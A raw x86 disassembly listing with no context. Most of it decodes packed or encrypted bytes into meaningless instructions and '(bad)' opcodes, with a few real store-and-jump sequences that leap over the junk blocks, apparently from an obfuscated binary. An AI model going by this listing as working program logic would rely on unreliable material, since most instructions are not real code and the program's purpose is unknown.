  4067f1:	adc    al,BYTE PTR [esi-0x6cc56e15]
  4067f7:	test   ebp,ebx
  4067f9:	push   0x842dc5ed
  4067fe:	pop    ebp
  4067ff:	test   eax,0x2a996997
  406804:	or     eax,0x4fa80631
  406809:	test   DWORD PTR ds:0x7d9b5107,edx
  40680f:	fisub  DWORD PTR [ebx+edi*1+0x769e1cc3]
  406816:	into   
  406817:	ds jmp 0x412383d0
  40681d:	dec    eax
  40681e:	pop    ecx
  40681f:	pusha  
  406820:	lods   eax,DWORD PTR ds:[esi]
  406821:	call   0x1c29:0x373b8509
  406828:	mov    esp,0xd32b2c78
  40682d:	adc    edx,ecx
  40682f:	pusha  
  406830:	xchg   esp,eax
  406831:	and    ecx,edi
  406833:	jp     0x406851
  406835:	dec    esp
  406836:	mov    bl,dh
  406838:	xchg   esp,eax
  406839:	add    cl,BYTE PTR [edi-0xf4b482a]
  40683f:	mov    ds:0xc26f7b4d,al
  406844:	xchg   BYTE PTR [eax+0x4fb7a839],cl
  40684a:	mov    bl,0xf2
  40684c:	adc    cl,0xd
  40684f:	add    ah,BYTE PTR [eax+0x1f]
  406852:	xchg   esi,eax
  406853:	sbb    ah,BYTE PTR [eax]
  406855:	mov    eax,ds:0x19641503
  40685a:	dec    edx
  40685b:	mov    ah,0x64
  40685d:	or     DWORD PTR [esi+0x3e9b5b32],edi
  406863:	inc    BYTE PTR [ebp-0x5b]
  406866:	mov    fs:0xb416f4b2,eax
  40686c:	push   eax
  40686d:	sub    eax,0x8f4c2390
  406872:	in     eax,0x88
  406874:	lds    eax,FWORD PTR [edi-0x34]
  406877:	adc    bh,0xe6
  40687a:	mov    ebx,0x7ab09e4e
  40687f:	into   
  406880:	add    eax,0x40b90fb4
  406885:	push   edi
  406886:	lahf   
  406887:	mov    ecx,0xe55dc8d1
  40688c:	jp     0x4068b7
  40688e:	jnp    0x406832
  406890:	inc    eax
  406891:	mov    esi,0xcd764955
  406896:	mov    bl,0xf8
  406898:	xchg   ecx,eax
  406899:	inc    ecx
  40689a:	sub    ebx,esi
  40689c:	xchg   ebx,eax
  40689d:	into   
  40689e:	pop    ss
  40689f:	sbb    esp,ebx
  4068a1:	cmp    DWORD PTR [eax+0xc],esi
  4068a4:	jns    0x40682a
  4068a6:	retf   
  4068a7:	in     eax,dx
  4068a8:	loopne 0x406861
  4068aa:	sti    
  4068ab:	data16 ja 0x4068b6
  4068ae:	dec    edi
  4068af:	dec    esi
  4068b0:	ins    DWORD PTR es:[edi],dx
  4068b1:	in     al,dx
  4068b2:	fwait
  4068b3:	iret   
  4068b4:	pop    eax
  4068b5:	adc    bl,BYTE PTR [esi+0x150ab94a]
  4068bb:	jne    0x4068f8
  4068bd:	mov    ebp,0xa1d48513
  4068c2:	neg    DWORD PTR [ecx]
  4068c4:	div    DWORD PTR [ebx]
  4068c6:	sbb    DWORD PTR [esi+0x3f],esi
  4068c9:	xor    DWORD PTR [eax+edx*2+0x40969fea],ebx
  4068d0:	cld    
  4068d1:	aam    0x97
  4068d3:	and    dh,BYTE PTR [edx+0x67564913]
  4068d9:	mov    ebx,0xe0a3fa0e
  4068de:	loope  0x4068d8
  4068e0:	cmc    
  4068e1:	jb     0x4068bd
  4068e3:	xchg   ebx,eax
  4068e4:	(bad)  
  4068e5:	(bad)  
  4068e6:	mov    ds,WORD PTR [esi+0x73]
  4068e9:	pop    edx
  4068ea:	adc    BYTE PTR [edx+esi*1],dl
  4068ed:	je     0x4068d9
  4068ef:	ss and eax,0xd9fd38bc
  4068f5:	sbb    esp,0x4a
  4068f8:	out    0x49,eax
  4068fa:	in     eax,dx
  4068fb:	in     al,dx
  4068fc:	sbb    ebp,DWORD PTR [edx]
  4068fe:	arpl   WORD PTR [ebp-0x7a],bx
  406901:	inc    edi
  406902:	inc    ecx
  406903:	mov    BYTE PTR [esi+edi*2],dl
  406906:	xlat   BYTE PTR ds:[ebx]
  406907:	adc    al,0x8f
  406909:	sbb    DWORD PTR [edi],esp
  40690b:	in     al,0xd7
  40690d:	mov    edx,0x6284524e
  406912:	jmp    0x9698:0x62ba2582
  406919:	mov    ds:0x9e528737,eax
  40691e:	pop    ebp
  40691f:	sbb    BYTE PTR [esi-0x4d],cl
  406922:	and    al,0x20
  406924:	pushf  
  406925:	ins    DWORD PTR es:[edi],dx
  406926:	fild   DWORD PTR [edi]
  406928:	jne    0x40692d
  40692a:	ret    0x6f51
  40692d:	int    0x9f
  40692f:	mov    dh,0x3b
  406931:	out    dx,al
  406932:	push   esp
  406933:	and    eax,0xd5486c44
  406938:	cmp    eax,0x2b2e7135
  40693d:	mov    ebp,0x422bb05a
  406942:	jno    0x4068e4
  406944:	cli    
  406945:	dec    esp
  406946:	out    0x7,al
  406948:	pushf  
  406949:	scas   al,BYTE PTR es:[edi]
  40694a:	das    
  40694b:	xor    esi,DWORD PTR [esi-0x37e45381]
  406951:	or     ecx,DWORD PTR [edx+0x46]
  406954:	dec    ebx
  406955:	out    dx,eax
  406956:	xor    al,0x9b
  406958:	aas    
  406959:	and    esi,DWORD PTR [esi-0x2b4697ae]
  40695f:	aas    
  406960:	ret    
  406961:	inc    ebp
  406962:	add    ebp,DWORD PTR [ecx+0x424822ee]
  406968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406969:	and    DWORD PTR [ebp-0xb6cc88f],0xcc31f60d
  406973:	fisttp WORD PTR [edx-0xe]
  406976:	inc    ecx
  406977:	clc    
  406978:	jg     0x40695c
  40697a:	cs jns 0x406921
  40697d:	sub    eax,0x8f3c4eb9
  406982:	jl     0x40699f
  406984:	sub    eax,0x9613371a
  406989:	stos   DWORD PTR es:[edi],eax
  40698a:	mov    ebx,0xeeeab666
  40698f:	scas   al,BYTE PTR es:[edi]
  406990:	mov    ds:0xc3e3acd9,eax
  406995:	test   ebx,ecx
  406997:	push   ebx
  406998:	or     BYTE PTR [eax+0x5b],al
  40699b:	cdq    
  40699c:	inc    edi
  40699d:	sbb    al,0x14
  40699f:	and    al,0x66
  4069a1:	sbb    eax,0xac7512d7
  4069a6:	es ss push ebp
  4069a9:	icebp  
  4069aa:	inc    esp
  4069ab:	jns    0x4069a6
  4069ad:	ret    0x60ee
  4069b0:	push   esp
  4069b1:	ins    DWORD PTR es:[edi],dx
  4069b2:	jo     0x406990
  4069b4:	int    0x57
  4069b6:	out    0xa3,al
  4069b8:	jnp    0x406950
  4069ba:	and    ecx,DWORD PTR [edi+ecx*8]
  4069bd:	mov    esp,0xf1b6bf62
  4069c2:	mov    DWORD PTR [ecx],eax
  4069c4:	mov    eax,DWORD PTR [ebp-0x24]
  4069c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4069ca:	xor    eax,esi
  4069cc:	add    eax,edi
  4069ce:	mov    DWORD PTR [ecx+0x4],eax
  4069d1:	mov    eax,DWORD PTR [ebp-0x2c]
  4069d4:	mov    ecx,DWORD PTR [ebp-0x8]
  4069d7:	mov    DWORD PTR [ecx+0x8],eax
  4069da:	mov    eax,DWORD PTR [ebp-0x30]
  4069dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4069e0:	jmp    0x406eeb
  4069e5:	ror    dh,1
  4069e7:	rol    edi,1
  4069e9:	fxch   st(3)
  4069eb:	fcmove st,st(5)
  4069ed:	xor    cl,BYTE PTR [esi-0x1e]
  4069f0:	rol    DWORD PTR [ebx+edi*4+0x1d],1
  4069f4:	inc    edx
  4069f5:	dec    edx
  4069f6:	int    0x78
  4069f8:	js     0x406a64
  4069fa:	jl     0x406a74
  4069fc:	js     0x4069de
  4069fe:	pushf  
  4069ff:	add    eax,0x7f802c64
  406a04:	cmc    
  406a05:	arpl   WORD PTR [esi-0x18e01999],cx
  406a0b:	stc    
  406a0c:	lock xchg BYTE PTR [edx-0x410f12ba],al
  406a13:	sub    edx,DWORD PTR [edi-0x6fc49d7]
  406a19:	shl    edx,1
  406a1b:	pop    ecx
  406a1d:	sub    ebp,esi
  406a1f:	loop   0x406a6b
  406a21:	push   esp
  406a22:	mov    DWORD PTR [esi-0x5fcb5aa8],0xbc05321
  406a2c:	addr16 pop esi
  406a2e:	push   edi
  406a2f:	sub    ch,cl
  406a31:	je     0x406aa9
  406a33:	and    al,BYTE PTR [ebx]
  406a35:	jb     0x406a48
  406a37:	xor    cl,BYTE PTR [eax-0xa]
  406a3a:	adc    al,0x9d
  406a3c:	(bad)  
  406a3e:	push   esi
  406a3f:	dec    edx
  406a40:	xor    edi,DWORD PTR [ecx]
  406a42:	mov    eax,0x1261301c
  406a47:	daa    
  406a48:	rcl    BYTE PTR [edx-0x1cbee9d2],1
  406a4e:	push   es
  406a4f:	ror    BYTE PTR [edi-0x6e1406e4],1
  406a55:	pop    edx
  406a56:	ss gs ja 0x406a7c
  406a5a:	cld    
  406a5b:	(bad)  
  406a5c:	mov    esp,0xd13b2b37
  406a61:	push   eax
  406a62:	addr16 hlt 
  406a64:	xchg   BYTE PTR [esi+0x4904afd0],al
  406a6a:	sbb    BYTE PTR [esi-0x4f],ch
  406a6d:	std    
  406a6e:	je     0x406a19
  406a70:	dec    edx
  406a71:	mov    gs,eax
  406a73:	pop    ebx
  406a74:	mov    ds:0xde23ce79,al
  406a79:	mov    eax,0x956b422e
  406a7e:	lea    edi,[edi]
  406a80:	push   cs
  406a81:	mov    bh,0xbe
  406a83:	inc    ecx
  406a84:	test   esp,eax
  406a86:	int    0x86
  406a88:	or     DWORD PTR [ebx+0x7024021e],0x4ffd5f2d
  406a92:	mov    eax,0xe145ebd7
  406a97:	pop    eax
  406a98:	xchg   edi,eax
  406a99:	lods   ax,WORD PTR ds:[esi]
  406a9b:	or     ebx,esp
  406a9d:	fdivr  DWORD PTR [esi-0x6b0c591c]
  406aa3:	cmp    DWORD PTR [esp+ecx*2-0x73b8a2a5],ebp
  406aaa:	jno    0x406b0b
  406aac:	and    eax,DWORD PTR [esi]
  406aae:	and    ecx,esp
  406ab0:	sub    DWORD PTR [ebp-0x71],esi
  406ab3:	test   BYTE PTR [ebx],0xce
  406ab6:	and    ecx,DWORD PTR [edx+eiz*8]
  406ab9:	jp     0x406a6b
  406abb:	mov    edi,0x86644e9c
  406ac0:	retf   0x2971
  406ac3:	test   al,0x28
  406ac5:	sub    DWORD PTR [ebx+0x33],ebp
  406ac8:	or     eax,0x70413932
  406acd:	(bad)  
  406acf:	pop    ss
  406ad0:	jmp    0xa9ee:0x1fec85a4
  406ad7:	mov    al,0x95
  406ad9:	dec    ebp
  406ada:	mov    ds:0x11ab28b4,al
  406adf:	adc    bl,BYTE PTR [edx+0x7df6dc99]
  406ae5:	mov    bh,dl
  406ae7:	outs   dx,DWORD PTR ds:[esi]
  406ae8:	xchg   BYTE PTR [ecx-0x1fe88a0],dh
  406aee:	ret    0xbfab
  406af1:	dec    ebx
  406af2:	push   0xffffffa8
  406af4:	pushf  
  406af5:	arpl   WORD PTR ds:0x2fa61ed3,si
  406afb:	xor    ch,bh
  406afd:	loope  0x406b4b
  406aff:	pushf  
  406b00:	mov    cl,0xdd
  406b02:	dec    edx
  406b03:	add    BYTE PTR [ebx],0xd1
  406b06:	mov    ds:0x7cade8ca,al
  406b0b:	ss mov ecx,0xb43eb937
  406b11:	stos   BYTE PTR es:[edi],al
  406b12:	xlat   BYTE PTR ds:[ebx]
  406b13:	push   ebx
  406b14:	std    
  406b15:	sbb    eax,0x9f49cc28
  406b1a:	push   edi
  406b1b:	mov    ch,BYTE PTR [ecx+eiz*8+0x7b271ed4]
  406b22:	lock add edi,edi
  406b25:	push   0xb63b68af
  406b2a:	ja     0x406b6e
  406b2c:	lods   al,BYTE PTR ds:[esi]
  406b2d:	mov    eax,0xc7312a
  406b32:	cli    
  406b33:	sub    DWORD PTR [ecx+edx*2+0x6a],ecx
  406b37:	mov    es,ebp
  406b39:	ret    
  406b3a:	in     al,0xb9
  406b3c:	or     bh,BYTE PTR [esi]
  406b3e:	sub    al,bh
  406b40:	cmp    eax,0xa4dd3437
  406b45:	xchg   DWORD PTR [ecx+0x58],ebx
  406b48:	ins    DWORD PTR es:[edi],dx
  406b49:	sbb    ebx,DWORD PTR [edi]
  406b4b:	ret    
  406b4c:	jle    0x406b89
  406b4e:	push   0xffffffd5
  406b50:	inc    edi
  406b51:	(bad)  
  406b52:	xor    eax,0x82a8d72a
  406b57:	fadd   QWORD PTR [eax+0x61]
  406b5a:	jmp    0x78115192
  406b5f:	mov    esi,0xbf8e26b6
  406b64:	cmp    al,0x39
  406b66:	test   DWORD PTR [esi+0x4f4de991],ebx
  406b6c:	mov    dh,dh
  406b6e:	sbb    esi,DWORD PTR [eax+edx*1-0x5592718e]
  406b75:	sti    
  406b76:	(bad)  [ebp-0x7c4b903a]
  406b7c:	je     0x406b54
  406b7e:	loopne 0x406b81
  406b80:	and    al,0x22
  406b82:	sti    
  406b83:	not    DWORD PTR [eax-0x9]
  406b86:	fwait
  406b87:	xchg   DWORD PTR [esi-0x3d],ebx
  406b8a:	(bad)  
  406b8b:	test   eax,0x712b654b
  406b90:	mov    ah,0xf7
  406b92:	lds    ebx,FWORD PTR [ecx]
  406b94:	sub    al,0x2e
  406b96:	push   edx
  406b97:	sub    BYTE PTR [esi+0x1e9bcf24],bh
  406b9d:	out    0x77,eax
  406b9f:	sub    esi,DWORD PTR [ebp+eax*4+0xbf1de16]
  406ba6:	and    ebx,esp
  406ba8:	popf   
  406ba9:	adc    dh,BYTE PTR [esi-0x586665e]
  406baf:	arpl   dx,bx
  406bb1:	frstor [eax-0x79]
  406bb4:	adc    al,0x49
  406bb6:	retf   
  406bb7:	mov    bl,BYTE PTR [ecx+esi*4+0x15]
  406bbb:	mov    dh,0xcd
  406bbd:	or     ebp,DWORD PTR [esi-0x57]
  406bc0:	cmp    ch,BYTE PTR ds:0xc2c6e089
  406bc6:	mov    dl,0x94
  406bc8:	jg     0x406b79
  406bca:	adc    esi,DWORD PTR [ebx-0x30]
  406bcd:	arpl   WORD PTR [eax+0x6766a63f],dx
  406bd3:	(bad)
  406bd7:	pusha  
  406bd8:	jle    0x406bdc
  406bda:	cdq    
  406bdb:	pop    es
  406bdc:	or     al,0xa9
  406bde:	(bad)  
  406bdf:	mov    DWORD PTR [edi],0xc6e3fec4
  406be5:	adc    BYTE PTR [esp+ecx*8+0x7c],ch
  406be9:	ss test DWORD PTR ss:[esi-0x7b19d2],0xb93c4634
  406bf5:	inc    edx
  406bf6:	sub    al,0x1d
  406bf8:	iret   
  406bf9:	xchg   BYTE PTR [edi],bh
  406bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bfc:	test   edi,edx
  406bfe:	xor    al,0xf8
  406c00:	xor    al,0x47
  406c02:	stos   DWORD PTR es:[edi],eax
  406c03:	es loop 0x406bf8
  406c06:	inc    edx
  406c07:	loop   0x406bc4
  406c09:	jmp    0xe2b5:0x7317174c
  406c10:	data16 ins BYTE PTR es:[edi],dx
  406c12:	call   0xff5b:0xbff8e3c6
  406c19:	test   eax,0x4d4f1963
  406c1e:	and    eax,0x18af9614
  406c23:	jno    0x406c06
  406c25:	and    eax,0x1a5eabbf
  406c2a:	sub    BYTE PTR ss:[edi-0x72],bh
  406c2e:	sti    
  406c2f:	adc    eax,0x1b31cbfd
  406c34:	lods   eax,DWORD PTR ds:[esi]
  406c35:	jbe    0x406c08
  406c37:	mov    dh,0x74
  406c39:	cmp    BYTE PTR [edx+0xe],cl
  406c3c:	or     ah,0x90
  406c3f:	xor    eax,0xefa263a
  406c44:	mov    ss,WORD PTR [esi+ebx*8-0x3cf1b030]
  406c4b:	xchg   ebp,eax
  406c4c:	add    al,0x6a
  406c4e:	fwait
  406c4f:	mov    cl,0x5c
  406c51:	sub    eax,0xac322689
  406c56:	or     eax,0xa3661b79
  406c5b:	mov    al,0xd0
  406c5d:	inc    eax
  406c5e:	sub    BYTE PTR [edx+esi*8],cl
  406c61:	lahf   
  406c62:	jmp    0x9eff:0x29016e38
  406c69:	std    
  406c6a:	mov    dh,0x24
  406c6c:	daa    
  406c6d:	jns    0x406c9d
  406c6f:	in     eax,0xb2
  406c71:	int3   
  406c72:	xchg   edi,eax
  406c73:	sub    al,0x28
  406c75:	popf   
  406c76:	jp     0x406cef
  406c78:	les    ecx,FWORD PTR [esi]
  406c7a:	or     ebx,DWORD PTR [ebx-0x57]
  406c7d:	jo     0x406ce9
  406c7f:	rcr    eax,0xb1
  406c82:	inc    edx
  406c83:	(bad)  
  406c84:	js     0x406c71
  406c86:	inc    ebx
  406c87:	xchg   BYTE PTR [esi-0x6c291651],al
  406c8d:	popf   
  406c8e:	(bad)  
  406c8f:	icebp  
  406c90:	pop    edi
  406c91:	push   ebp
  406c92:	enter  0x8ab6,0x91
  406c96:	cmp    al,0xaf
  406c98:	xchg   esi,edx
  406c9a:	test   BYTE PTR [eax+0x7d],dh
  406c9d:	sub    esp,DWORD PTR [ebx+0x2f]
  406ca0:	loope  0x406c8e
  406ca2:	inc    ebp
  406ca3:	xchg   DWORD PTR [ebp-0x11],esi
  406ca6:	jb     0x406c2a
  406ca8:	mov    dl,0x6f
  406caa:	push   es
  406cab:	cmp    ebx,DWORD PTR gs:[eax+0x7fc09105]
  406cb2:	dec    edx
  406cb3:	sbb    al,BYTE PTR [ebp-0x50]
  406cb6:	shl    DWORD PTR [eax],cl
  406cb8:	pop    ebx
  406cb9:	cld    
  406cba:	jp     0x406cdf
  406cbc:	out    0x20,al
  406cbe:	mov    edi,0xfd4aea
  406cc3:	sbb    eax,0xd65db827
  406cc8:	jge    0x406d46
  406cca:	(bad)  
  406ccb:	jmp    0x406c68
  406ccd:	push   ecx
  406cce:	outs   dx,DWORD PTR ds:[esi]
  406ccf:	test   eax,0xb531186c
  406cd4:	pop    ecx
  406cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd6:	xchg   esi,eax
  406cd7:	adc    bl,ah
  406cd9:	jae    0x406c73
  406cdb:	aam    0x31
  406cdd:	icebp  
  406cde:	sbb    al,bh
  406ce0:	test   ah,ah
  406ce2:	cmc    
  406ce3:	ins    BYTE PTR es:[edi],dx
  406ce4:	sbb    eax,0xfaf7a08e
  406ce9:	loope  0x406d41
  406ceb:	fcmovu st,st(5)
  406ced:	mov    ds:0x3dbc825b,al
  406cf2:	mov    ds:0x42808272,eax
  406cf7:	xchg   ebx,eax
  406cf8:	cmp    ecx,ecx
  406cfa:	lock retf 
  406cfc:	in     eax,dx
  406cfd:	pop    edx
  406cfe:	xchg   edi,eax
  406cff:	and    DWORD PTR [edi+0x12ab05ca],0xa7a19e0a
  406d09:	gs mov ah,0x8e
  406d0c:	into   
  406d0d:	aas    
  406d0e:	js     0x406cc3
  406d10:	and    BYTE PTR [eax-0x3e],cl
  406d13:	or     al,0xe4
  406d15:	scas   eax,DWORD PTR es:[edi]
  406d16:	fiadd  WORD PTR [eax]
  406d18:	mov    edx,ebp
  406d1a:	add    esp,DWORD PTR [edx-0x63f271f4]
  406d20:	neg    ecx
  406d22:	clc    
  406d23:	inc    ebx
  406d24:	dec    esi
  406d25:	mov    eax,0x578ff619
  406d2a:	dec    esp
  406d2b:	ins    BYTE PTR es:[edi],dx
  406d2c:	cmp    eax,0x613d419e
  406d31:	jae    0x406d20
  406d33:	pop    ss
  406d34:	lahf   
  406d35:	mov    ebp,DWORD PTR [eax+0x671c1842]
  406d3b:	fdivr  DWORD PTR [si+0x11e5]
  406d40:	fbld   TBYTE PTR ds:0x18de6d4c
  406d46:	mov    BYTE PTR [eax+0x2e460652],al
  406d4c:	fidivr WORD PTR ds:0xcbfb47e0
  406d52:	inc    eax
  406d53:	jl     0x406cd8
  406d55:	and    al,0x3d
  406d57:	inc    DWORD PTR [ebx-0x62]
  406d5a:	sbb    dh,BYTE PTR [edx+0x36]
  406d5d:	pop    ebp
  406d5e:	loope  0x406d24
  406d60:	cmp    al,0x92
  406d62:	bnd ret 0x4e87
  406d66:	jae    0x406d8c
  406d68:	cmp    edi,DWORD PTR [ebx+0x221c3a49]
  406d6e:	rcl    DWORD PTR [esi],1
  406d70:	jg     0x406d67
  406d72:	(bad)  [ebx+esi*8+0x58]
  406d76:	jo     0x406d96
  406d78:	add    BYTE PTR [eax+0x36eef2e2],al
  406d7e:	or     DWORD PTR [ebx],eax
  406d80:	inc    edi
  406d81:	vpcmpgtw xmm2,xmm2,XMMWORD PTR [edx]
  406d85:	and    al,0x7
  406d87:	icebp  
  406d88:	rol    BYTE PTR [edi+0x1e],0x94
  406d8c:	outs   dx,DWORD PTR ds:[esi]
  406d8d:	sub    al,0x76
  406d8f:	ins    BYTE PTR es:[edi],dx
  406d90:	xor    DWORD PTR [ebx+ecx*8],edx
  406d93:	das    
  406d94:	jno    0x406e01
  406d96:	push   ecx
  406d97:	pop    ebx
  406d98:	imul   DWORD PTR [eax]
  406d9a:	mov    ah,0x1e
  406d9c:	adc    dl,BYTE PTR [ebp+0x6d0ec175]
  406da2:	jecxz  0x406d67
  406da4:	jle    0x406dc4
  406da6:	sub    DWORD PTR [ecx-0x426d8629],ebp
  406dac:	push   ds
  406dad:	imul   esp,DWORD PTR [eax-0x5b],0x4c
  406db1:	mov    al,0xab
  406db3:	dec    edx
  406db4:	retf   0x9d9a
  406db7:	vpmullw xmm4,xmm3,xmm6
  406dbb:	sbb    eax,eax
  406dbd:	imul   eax,DWORD PTR [ecx],0x36
  406dc0:	call   0xd06a:0x479c09dd
  406dc7:	inc    esp
  406dc8:	stc    
  406dc9:	jmp    0xa616bb12
  406dce:	sbb    BYTE PTR [edx+edi*2+0x5c717391],0x92
  406dd6:	imul   esp,eax,0x56
  406dd9:	(bad)  
  406dda:	fdivr  DWORD PTR [eax+ecx*8-0x6b]
  406dde:	retf   
  406ddf:	loop   0x406e1d
  406de1:	ret    0x9706
  406de4:	fidivr WORD PTR [edi+ebx*2+0x2303dbef]
  406deb:	adc    ah,bh
  406ded:	pusha  
  406dee:	fst    DWORD PTR [ebx+0x3ba5a61d]
  406df4:	les    esp,FWORD PTR [ebp-0x3d]
  406df7:	popf   
  406df8:	jecxz  0x406e44
  406dfa:	cmp    bl,BYTE PTR [eax]
  406dfc:	cmp    DWORD PTR [esi],esi
  406dfe:	mov    bh,0x4b
  406e00:	outs   dx,BYTE PTR ds:[esi]
  406e01:	sbb    cl,BYTE PTR [edx+0x5e434c3b]
  406e07:	adc    DWORD PTR [edx+0x49da70a6],0x48f8d47b
  406e11:	inc    esp
  406e12:	ins    BYTE PTR es:[edi],dx
  406e13:	ret    0xdd54
  406e16:	mov    al,0x3d
  406e18:	mov    cl,0x50
  406e1a:	mov    ch,BYTE PTR [ecx+0x6e]
  406e1d:	pop    edx
  406e1e:	jne    0x406e93
  406e20:	add    eax,DWORD PTR [ecx-0x2853dccb]
  406e26:	loop   0x406e3f
  406e28:	dec    esp
  406e29:	jmp    0x344ba373
  406e2e:	adc    esp,DWORD PTR [ecx]
  406e30:	inc    edi
  406e31:	imul   ebx,DWORD PTR [esi+0x761dde45],0xe09db2a3
  406e3b:	stc    
  406e3c:	lahf   
  406e3d:	nop
  406e3e:	retf   
  406e3f:	in     al,0x76
  406e41:	ins    DWORD PTR es:[edi],dx
  406e42:	jecxz  0x406e29
  406e44:	rcl    dh,1
  406e46:	jno    0x406ec7
  406e48:	push   ecx
  406e49:	aam    0x99
  406e4b:	hlt    
  406e4c:	pop    ebx
  406e4d:	daa    
  406e4e:	jle    0x406e87
  406e50:	repnz sub DWORD PTR [esi],0xfffffff9
  406e54:	lea    edx,[edx+esi*4]
  406e57:	popa   
  406e58:	dec    edi
  406e59:	pop    ebp
  406e5a:	(bad)  
  406e5b:	lea    ecx,[edx+ecx*8]
  406e5e:	inc    esi
  406e5f:	sub    al,BYTE PTR [esp+ebp*4]
  406e62:	or     ch,BYTE PTR [eax-0x48]
  406e65:	stos   DWORD PTR es:[edi],eax
  406e66:	pop    eax
  406e67:	mov    ds:0x94d96e6c,eax
  406e6c:	mov    ebp,0x28545973
  406e71:	jns    0x406e15
  406e73:	sbb    BYTE PTR ds:0x5a8559c0,dh
  406e79:	(bad)  
  406e7a:	cmp    eax,0x722e37ba
  406e7f:	popa   
  406e80:	sub    eax,0xb46a8d05
  406e85:	pop    ecx
  406e86:	mov    ds:0x2e136c63,al
  406e8b:	imul   eax,edi,0x37
  406e8e:	or     al,dh
  406e90:	dec    esp
  406e91:	cmp    edx,ebp
  406e93:	adc    DWORD PTR [eax],esi
  406e95:	sbb    al,0xdf
  406e97:	mov    ebp,0x52e18b2e
  406e9c:	sub    BYTE PTR [ebp+0x1a7c2c85],cl
  406ea2:	jle    0x406f11
  406ea4:	mov    ebp,0x6319a826
  406ea9:	and    edi,DWORD PTR [ebx]
  406eab:	inc    ebx
  406eac:	clc    
  406ead:	inc    eax
  406eae:	stos   BYTE PTR es:[edi],al
  406eaf:	push   cs
  406eb0:	psubw  mm0,mm2
  406eb3:	sub    BYTE PTR [edi],bl
  406eb5:	ds dec ebp
  406eb7:	jnp    0x406e97
  406eb9:	fsub   DWORD PTR [eax]
  406ebb:	aad    0x14
  406ebd:	add    DWORD PTR ds:0xb35f2fe6,ebp
  406ec3:	call   0xdb4d:0xe90858cf
  406eca:	jae    0x406f23
  406ecc:	and    al,0x11
  406ece:	mov    edx,0xbfd06d63
  406ed3:	push   edx
  406ed4:	ja     0x406f55
  406ed6:	jle    0x406f30
  406ed8:	mov    ch,0x3a
  406eda:	jg     0x406e94
  406edc:	pushf  
  406edd:	jl     0x406e78
  406edf:	xlat   BYTE PTR ds:[ebx]
  406ee0:	(bad)  
  406ee1:	jb     0x406eed
  406ee3:	sti    
  406ee4:	cs jo  0x406f4b
  406ee7:	cmc    
  406ee8:	in     al,0x44
  406eea:	into   
  406eeb:	mov    DWORD PTR [ecx+0xc],eax
  406eee:	mov    eax,DWORD PTR [ebp-0x34]
  406ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  406ef4:	jmp    0x4073ff
  406ef9:	ror    ecx,1
  406efb:	ror    cl,cl
  406efd:	fcmovu st,st(1)
  406eff:	(bad)  
  406f01:	aas    
  406f02:	scas   eax,DWORD PTR es:[edi]
  406f03:	push   ebp
  406f04:	add    esp,0xffffff80
  406f07:	mov    ebp,0x78d0b47a
  406f0c:	js     0x406f78
  406f0e:	jl     0x406f88
  406f10:	js     0x406f64
  406f12:	imul   edx,DWORD PTR [esp+edx*1+0x70],0x70
  406f17:	pop    esp
  406f18:	and    dh,bh
  406f1a:	mov    dl,0xdd
  406f1c:	adc    eax,0xf450eacd
  406f21:	mov    ds:0xa89b62e5,eax
  406f26:	lods   eax,DWORD PTR ds:[esi]
  406f27:	fidivr WORD PTR [eax-0x2b269c0d]
  406f2d:	cmp    cl,BYTE PTR [edx-0x652017de]
  406f33:	mov    bh,0xd6
  406f35:	pop    ds
  406f36:	pop    ss
  406f37:	jno    0x406f79
  406f39:	sub    eax,0xce618f57
  406f3e:	and    eax,0x33a863a4
  406f43:	std    
  406f44:	mov    ds:0x98c731cc,al
  406f49:	and    bl,BYTE PTR ss:[ecx]
  406f4c:	into   
  406f4d:	in     al,dx
  406f4e:	pop    eax
  406f4f:	mov    edi,0x3fb01b0f
  406f54:	push   ebx
  406f55:	xor    DWORD PTR [eax+0x21],ebx
  406f58:	push   ds
  406f59:	iret   
  406f5a:	sar    cl,0x69
  406f5d:	retf   0x2afb
  406f60:	push   ecx
  406f61:	call   0x51ad:0x9151e5df
  406f68:	adc    eax,esp
  406f6a:	les    ebx,FWORD PTR [edi-0x6e21261b]
  406f70:	mov    ds:0x98d6a42b,al
  406f75:	rol    BYTE PTR [ecx+0x42],cl
  406f78:	addr16 stc 
  406f7a:	mov    esi,0xc1f9d42e
  406f7f:	outs   dx,BYTE PTR ds:[esi]
  406f80:	imul   esp,ebx,0xffffffc8
  406f83:	pop    ecx
  406f84:	test   al,0x9e
  406f86:	mov    ah,0xbb
  406f88:	cmp    DWORD PTR [edi-0x318262a9],esi
  406f8e:	fdivr  st,st(3)
  406f90:	call   0x636:0x556ec6b1
  406f97:	pop    edi
  406f98:	test   DWORD PTR [esi-0x1ba7ccd9],eax
  406f9e:	push   esp
  406f9f:	sub    al,0xee
  406fa1:	cmc    
  406fa2:	das    
  406fa3:	dec    ecx
  406fa4:	fadd   DWORD PTR [esi+0x7]
  406fa7:	xor    eax,0x7211f7a9
  406fac:	(bad)  [eax-0x4ef233b8]
  406fb2:	leave  
  406fb3:	stc    
  406fb4:	push   es
  406fb5:	jae    0x40702b
  406fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fb8:	(bad)  
  406fb9:	cmp    eax,0x9ca8a75
  406fbe:	sbb    al,0xd9
  406fc0:	in     eax,dx
  406fc1:	xor    al,0xfe
  406fc3:	es (bad) 
  406fc5:	aas    
  406fc6:	retf   
  406fc7:	pop    esp
  406fc8:	gs test al,0xcb
  406fcb:	add    DWORD PTR [edi],eax
  406fcd:	mov    ds:0x7de079f5,al
  406fd2:	(bad)  
  406fd3:	in     al,dx
  406fd4:	mov    bh,0x41
  406fd6:	add    eax,DWORD PTR [ebp-0x247befb5]
  406fdc:	pushf  
  406fdd:	pop    edi
  406fde:	cmp    edi,DWORD PTR [edi]
  406fe0:	das    
  406fe1:	or     DWORD PTR [ecx-0x32],ebx
  406fe4:	ret    0xf10c
  406fe7:	push   esp
  406fe8:	imul   ecx,eax,0xa135e5
  406fee:	fdivr  DWORD PTR [esi]
  406ff0:	test   DWORD PTR [ebx-0x35713e35],eax
  406ff6:	mov    edx,0x98b7ec7a
  406ffb:	pop    sp
  406ffd:	pop    ss
  406ffe:	fistp  WORD PTR [bx+di]
  407001:	test   al,0x9e
  407003:	cmp    BYTE PTR [edi-0x2af316c],dl
  407009:	pop    es
  40700a:	mov    ebx,0x3c5a18dc
